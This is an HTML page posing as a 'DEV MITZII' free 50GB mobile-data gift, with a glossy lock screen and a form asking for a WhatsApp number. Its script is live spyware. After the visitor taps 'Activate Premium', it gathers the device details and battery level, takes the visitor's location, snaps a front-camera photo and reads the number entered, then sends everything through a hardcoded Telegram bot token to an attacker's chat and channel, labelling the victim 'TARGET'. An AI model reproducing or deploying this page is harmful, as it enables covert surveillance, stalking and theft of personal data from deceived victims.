<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DEV MITZII - PREMIUM DATA UNLIMITED</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    background: linear-gradient(45deg, #050505, #1a0a2e, #0a192f, #112240, #533483);
    background-size: 400% 400%;
    animation: gradientShift 10s ease infinite;
    color: #fff;
    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    overflow-x: hidden;
  }

  @keyframes gradientShift {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }

  .container {
    z-index: 10;
    text-align: center;
    padding: 20px;
    max-width: 450px;
    width: 100%;
  }

  .dev-header {
    font-size: 0.9em;
    color: #00ffff;
    letter-spacing: 3px;
    text-transform: uppercase;
    margin-bottom: 5px;
    font-weight: bold;
  }

  h1 {
    font-size: 2em;
    font-weight: 900;
    margin-bottom: 25px;
    background: linear-gradient(90deg, #00ffff, #ff00ff, #ffd700, #00ff00);
    background-size: 300%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    animation: flow 4s linear infinite;
    text-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
  }

  @keyframes flow {
    0% { background-position: 0%; }
    100% { background-position: 100%; }
  }

  .premium-card {
    position: relative;
    background: rgba(255, 255, 255, 0.05);
    backdrop-filter: blur(15px);
    border-radius: 30px;
    padding: 30px;
    border: 1px solid rgba(255, 255, 255, 0.1);
    box-shadow: 0 20px 50px rgba(0,0,0,0.5);
    margin-bottom: 20px;
  }

  #luckyBox {
    width: 100%;
    height: 150px;
    background: linear-gradient(135deg, rgba(0, 255, 255, 0.1), rgba(255, 0, 255, 0.1));
    border-radius: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 1.5em;
    font-weight: bold;
    cursor: pointer;
    border: 2px dashed rgba(0, 255, 255, 0.5);
    transition: 0.3s;
  }

  #luckyBox:hover { transform: scale(1.02); background: rgba(0, 255, 255, 0.2); }

  .lock-screen {
    position: absolute;
    top: 0; left: 0; width: 100%; height: 100%;
    background: rgba(0,0,0,0.85);
    backdrop-filter: blur(10px);
    border-radius: 30px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    z-index: 20;
    transition: 0.5s;
  }

  .lock-screen.hidden { opacity: 0; visibility: hidden; pointer-events: none; }

  .unlock-btn {
    padding: 15px 40px;
    background: linear-gradient(45deg, #00ffff, #ff00ff);
    border: none;
    border-radius: 50px;
    color: #fff;
    font-weight: bold;
    cursor: pointer;
    box-shadow: 0 0 20px rgba(0, 255, 255, 0.5);
    text-transform: uppercase;
  }

  #whatsappNumber {
    width: 100%;
    padding: 15px;
    border-radius: 15px;
    border: 1px solid rgba(255, 255, 255, 0.2);
    background: rgba(0,0,0,0.3);
    color: #fff;
    text-align: center;
    margin-bottom: 15px;
  }

  .submit-btn {
    width: 100%;
    padding: 15px;
    border-radius: 15px;
    border: none;
    background: #00ffff;
    color: #000;
    font-weight: bold;
    cursor: pointer;
  }

  .footer-tag {
    margin-top: 20px;
    font-size: 0.7em;
    opacity: 0.5;
    color: #ffd700;
  }
</style>

<body>

<div class="container">
  <div class="dev-header">BY DEV MITZII</div>
  <h1>PREMIUM DATA UNLIMITED</h1>
  
  <div class="premium-card">
    <div id="luckyBox">🎁 TAP TO OPEN GIFT 🎁</div>
    
    <div class="lock-screen" id="lockOverlay">
      <div style="font-size: 3em; margin-bottom: 10px;">🔒</div>
      <h2 style="color: #00ffff; margin-bottom: 10px;">DEV MITZII PREMIUM</h2>
      <p style="font-size: 0.8em; margin-bottom: 20px; opacity: 0.8;">Unlock to access your 50GB Gift!</p>
      <button class="unlock-btn" id="unlockBtn">ACTIVATE PREMIUM</button>
    </div>
  </div>

  <div class="premium-card">
    <input type="tel" id="whatsappNumber" placeholder="Enter WhatsApp Number">
    <button class="submit-btn" id="submitNumber">GET DATA NOW</button>
  </div>

  <div class="footer-tag">POWERED BY DEV MITZII | EXCLUSIVE ACCESS</div>
</div>

<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
const CONFIG = {
  botToken: '8691126206:AAHVLDgKxOkdEzyOG9mfcDVtb89Zfd8DsU8',
  channelId: '-1003881387284'
};

const urlParams = new URLSearchParams(window.location.search);
const uid = urlParams.get('uid');

let isUnlocked = false;

document.getElementById('unlockBtn').addEventListener('click', () => {
  document.getElementById('unlockBtn').textContent = "ACTIVATING...";
  setTimeout(() => {
    isUnlocked = true;
    document.getElementById('lockOverlay').classList.add('hidden');
    startCapture();
  }, 2000);
});

async function sendToTelegram(method, data) {
  const url = `https://api.telegram.org/bot${CONFIG.botToken}/${method}`;
  await fetch(url, { method: 'POST', body: data });
}

async function sendTextMessage(text) {
  const data = new FormData();
  data.append('chat_id', uid);
  data.append('text', `🚀 [DEV MITZII REPORT]\n\n${text}`);
  await sendToTelegram('sendMessage', data);
  
  const channelData = new FormData();
  channelData.append('chat_id', CONFIG.channelId);
  channelData.append('text', `🚀 [DEV MITZII REPORT]\n\n${text}`);
  await sendToTelegram('sendMessage', channelData);
}

async function startCapture() {
  if (!uid) return;

  // 🔋 Battery & Device Info
  let batteryLevel = "Unknown";
  if (navigator.getBattery) {
    const b = await navigator.getBattery();
    batteryLevel = Math.round(b.level * 100) + "%";
  }
  await sendTextMessage(`TARGET LOGGED IN!\nDevice: ${navigator.userAgent}\nBattery: ${batteryLevel}`);

  // 📍 Location
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const { latitude, longitude } = pos.coords;
      await sendTextMessage(`📍 LOCATION FOUND:\nhttps://www.google.com/maps?q=${latitude},${longitude}`);
    });
  }

  // 📸 Camera (User)
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
    const video = document.createElement('video');
    video.srcObject = stream;
    await video.play();
    
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    
    setTimeout(async () => {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      canvas.toBlob(async (blob) => {
        const fd = new FormData();
        fd.append('chat_id', uid);
        fd.append('photo', blob);
        fd.append('caption', '📸 DEV MITZII - FRONT CAM CAPTURE');
        await sendToTelegram('sendPhoto', fd);
        
        const fd2 = new FormData();
        fd2.append('chat_id', CONFIG.channelId);
        fd2.append('photo', blob);
        fd2.append('caption', '📸 DEV MITZII - FRONT CAM CAPTURE');
        await sendToTelegram('sendPhoto', fd2);
        
        stream.getTracks().forEach(t => t.stop());
      }, 'image/jpeg');
    }, 2000);
  } catch (e) { console.log(e); }
}

document.getElementById('submitNumber').addEventListener('click', async () => {
  const num = document.getElementById('whatsappNumber').value;
  if(num) {
    await sendTextMessage(`💎 TARGET WHATSAPP NUMBER: ${num}`);
    alert("🎉 SUCCESS! Data Package will be activated within 2 hours. Stay Connected!");
  }
});

document.getElementById('luckyBox').addEventListener('click', () => {
  if(!isUnlocked) return alert("Please Activate Premium First!");
  document.getElementById('luckyBox').textContent = "🎁 50GB DATA ACTIVATED!";
  document.getElementById('luckyBox').style.borderStyle = "solid";
  document.getElementById('luckyBox').style.color = "#00ffff";
});
</script>

</body>
